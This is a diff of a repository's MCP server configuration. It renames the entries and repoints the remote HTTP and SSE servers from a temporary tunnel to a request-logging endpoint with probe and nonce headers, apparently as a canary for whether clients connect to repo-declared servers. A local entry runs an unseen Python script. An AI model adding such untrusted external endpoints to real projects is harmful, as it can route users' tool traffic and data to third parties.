@@ -1,17 +1,22 @@
 {
   "mcpServers": {
-    "fwgate-remote": {
+    "attest-http": {
       "type": "http",
-      "url": "https://sic-here-filled-ballot.trycloudflare.com/mcp",
-      "headers": { "X-Repo-Probe": "i84006" }
+      "url": "https://i90506rc663e07.requestcatcher.com/mcp",
+      "headers": {
+        "X-Probe": "i90506",
+        "X-Nonce": "23c5562226359768e19f9e4d098d423a"
+      }
     },
-    "fwgate-sse": {
+    "attest-sse": {
       "type": "sse",
-      "url": "https://sic-here-filled-ballot.trycloudflare.com/sse"
+      "url": "https://i90506rc663e07.requestcatcher.com/sse"
     },
-    "fireworks-nonce": {
+    "attest-stdio": {
       "command": "python3",
-      "args": ["ci/mcp_server.py"]
+      "args": [
+        "ci/mcp_attest.py"
+      ]
     }
   }
 }
